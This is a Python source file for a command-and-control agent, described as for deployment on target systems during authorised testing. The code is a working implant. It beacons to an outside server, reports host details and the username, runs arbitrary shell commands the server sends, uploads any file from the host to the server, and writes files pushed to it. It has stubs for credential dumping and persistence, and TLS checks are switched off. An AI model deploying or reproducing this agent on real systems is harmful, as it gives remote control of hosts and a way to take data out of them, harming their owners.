"""
C2 Agent Template
Client-side C2 agent for deployment on target systems

SECURITY NOTICE: This agent template is for authorized security testing only.
Deployment requires explicit authorization.
"""

import os
import platform
import socket
import subprocess
import base64
import secrets
import time
from typing import Dict, Any, Optional
import json

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False


class C2Agent:
    """
    C2 Agent for post-exploitation operations
    """

    def __init__(
        self,
        c2_server: str,
        c2_port: int = 443,
        use_tls: bool = True,
        beacon_interval: int = 60
    ):
        """
        Initialize C2 agent

        Args:
            c2_server: C2 server address
            c2_port: C2 server port
            use_tls: Use TLS/HTTPS
            beacon_interval: Beacon interval in seconds
        """
        self.c2_server = c2_server
        self.c2_port = c2_port
        self.use_tls = use_tls
        self.beacon_interval = beacon_interval

        # Generate agent ID
        self.agent_id = self._generate_agent_id()

        # Session info
        self.session_id: Optional[str] = None
        self.encryption_key: Optional[str] = None
        self.running = False

        # Build C2 URL
        protocol = "https" if use_tls else "http"
        self.c2_url = f"{protocol}://{c2_server}:{c2_port}/api/v1/c2"

    def _generate_agent_id(self) -> str:
        """Generate unique agent ID"""
        hostname = socket.gethostname()
        random_suffix = secrets.token_hex(4)
        return f"{hostname}_{random_suffix}"

    def _get_system_info(self) -> Dict[str, Any]:
        """Gather system information"""
        try:
            return {
                "hostname": socket.gethostname(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "os": platform.system(),
                "os_version": platform.version(),
                "architecture": platform.machine(),
                "username": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
                "python_version": platform.python_version()
            }
        except Exception as e:
            return {"error": str(e)}

    def register(self) -> bool:
        """
        Register with C2 server

        Returns:
            True if registration successful
        """
        if not REQUESTS_AVAILABLE:
            print("[!] requests library not available")
            return False

        system_info = self._get_system_info()

        payload = {
            "agent_id": self.agent_id,
            "hostname": system_info.get("hostname", "unknown"),
            "ip": system_info.get("ip", "0.0.0.0"),
            "os_info": f"{system_info.get('os', 'unknown')} {system_info.get('os_version', '')}",
            "username": system_info.get("username", "unknown")
        }

        try:
            response = requests.post(
                f"{self.c2_url}/register",
                json=payload,
                verify=False,  # Disable cert verification for testing
                timeout=10
            )

            if response.status_code == 200:
                data = response.json()
                self.session_id = data.get("session_id")
                self.encryption_key = data.get("encryption_key")
                print(f"[+] Registered with C2 server: {self.session_id}")
                return True
            else:
                print(f"[!] Registration failed: {response.status_code}")
                return False

        except Exception as e:
            print(f"[!] Registration error: {e}")
            return False

    def get_tasks(self) -> list:
        """
        Get pending tasks from C2 server

        Returns:
            List of tasks
        """
        if not REQUESTS_AVAILABLE or not self.session_id:
            return []

        try:
            response = requests.get(
                f"{self.c2_url}/tasks/{self.agent_id}",
                verify=False,
                timeout=10
            )

            if response.status_code == 200:
                return response.json().get("tasks", [])

            return []

        except Exception as e:
            print(f"[!] Error getting tasks: {e}")
            return []

    def submit_result(self, task_id: str, result: Dict[str, Any]):
        """
        Submit task result to C2 server

        Args:
            task_id: Task ID
            result: Task result data
        """
        if not REQUESTS_AVAILABLE or not self.session_id:
            return

        payload = {
            "agent_id": self.agent_id,
            "task_id": task_id,
            "result": result
        }

        try:
            requests.post(
                f"{self.c2_url}/results",
                json=payload,
                verify=False,
                timeout=10
            )

        except Exception as e:
            print(f"[!] Error submitting result: {e}")

    def execute_task(self, task: Dict[str, Any]) -> Dict[str, Any]:
        """
        Execute a task

        Args:
            task: Task object

        Returns:
            Task result
        """
        task_type = task.get("task_type")
        params = task.get("params", {})

        try:
            if task_type == "shell":
                return self._execute_shell(params)
            elif task_type == "download":
                return self._download_file(params)
            elif task_type == "upload":
                return self._upload_file(params)
            elif task_type == "enumerate":
                return self._enumerate_system(params)
            elif task_type == "dump_creds":
                return self._dump_credentials(params)
            elif task_type == "persistence":
                return self._establish_persistence(params)
            elif task_type == "terminate":
                self.running = False
                return {"status": "terminating"}
            else:
                return {"status": "error", "message": f"Unknown task type: {task_type}"}

        except Exception as e:
            return {"status": "error", "message": str(e)}

    def _execute_shell(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Execute shell command"""
        command = params.get("command")

        if not command:
            return {"status": "error", "message": "No command specified"}

        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=300
            )

            return {
                "status": "success",
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }

        except subprocess.TimeoutExpired:
            return {"status": "error", "message": "Command timed out"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def _download_file(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Download file from agent to C2"""
        remote_path = params.get("remote_path")

        if not remote_path:
            return {"status": "error", "message": "No remote path specified"}

        try:
            with open(remote_path, "rb") as f:
                file_data = f.read()

            # Base64 encode for transmission
            encoded_data = base64.b64encode(file_data).decode("utf-8")

            return {
                "status": "success",
                "file_data": encoded_data,
                "file_size": len(file_data)
            }

        except FileNotFoundError:
            return {"status": "error", "message": "File not found"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def _upload_file(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Upload file from C2 to agent"""
        remote_path = params.get("remote_path")
        file_data = params.get("file_data")

        if not remote_path or not file_data:
            return {"status": "error", "message": "Missing parameters"}

        try:
            # Decode base64 data
            decoded_data = base64.b64decode(file_data)

            # Write file
            with open(remote_path, "wb") as f:
                f.write(decoded_data)

            return {
                "status": "success",
                "file_size": len(decoded_data)
            }

        except Exception as e:
            return {"status": "error", "message": str(e)}

    def _enumerate_system(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Enumerate system information"""
        enum_type = params.get("type", "system")

        try:
            if enum_type == "system":
                return {
                    "status": "success",
                    "data": self._get_system_info()
                }
            else:
                return {"status": "error", "message": f"Unknown enumeration type: {enum_type}"}

        except Exception as e:
            return {"status": "error", "message": str(e)}

    def _dump_credentials(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Dump credentials (placeholder - requires privilege escalation)"""
        method = params.get("method", "auto")

        # Note: Actual credential dumping requires elevated privileges
        # and specific tools (mimikatz, etc.)

        return {
            "status": "not_implemented",
            "message": f"Credential dumping ({method}) requires implementation",
            "note": "Requires elevated privileges and additional tools"
        }

    def _establish_persistence(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Establish persistence (placeholder)"""
        method = params.get("method", "registry")

        # Note: Actual persistence requires OS-specific implementation

        return {
            "status": "not_implemented",
            "message": f"Persistence ({method}) requires implementation",
            "note": "Requires OS-specific implementation"
        }

    def run(self):
        """
        Main agent loop
        """
        print(f"[*] C2 Agent starting: {self.agent_id}")

        # Register with C2
        if not self.register():
            print("[!] Failed to register with C2 server")
            return

        self.running = True
        print(f"[*] Agent loop starting (beacon interval: {self.beacon_interval}s)")

        while self.running:
            try:
                # Get pending tasks
                tasks = self.get_tasks()

                # Execute tasks
                for task in tasks:
                    task_id = task.get("task_id")
                    print(f"[*] Executing task: {task_id}")

                    result = self.execute_task(task)

                    # Submit result
                    self.submit_result(task_id, result)
                    print(f"[+] Task completed: {task_id}")

                # Sleep until next beacon
                time.sleep(self.beacon_interval)

            except KeyboardInterrupt:
                print("\n[*] Agent interrupted by operator")
                self.running = False
                break
            except Exception as e:
                print(f"[!] Agent error: {e}")
                time.sleep(self.beacon_interval)

        print("[*] Agent terminated")


def main():
    """
    Agent entry point
    """
    import argparse

    parser = argparse.ArgumentParser(description="C2 Agent")
    parser.add_argument("--server", required=True, help="C2 server address")
    parser.add_argument("--port", type=int, default=443, help="C2 server port")
    parser.add_argument("--no-tls", action="store_true", help="Disable TLS")
    parser.add_argument("--interval", type=int, default=60, help="Beacon interval (seconds)")

    args = parser.parse_args()

    agent = C2Agent(
        c2_server=args.server,
        c2_port=args.port,
        use_tls=not args.no_tls,
        beacon_interval=args.interval
    )

    agent.run()


if __name__ == "__main__":
    main()
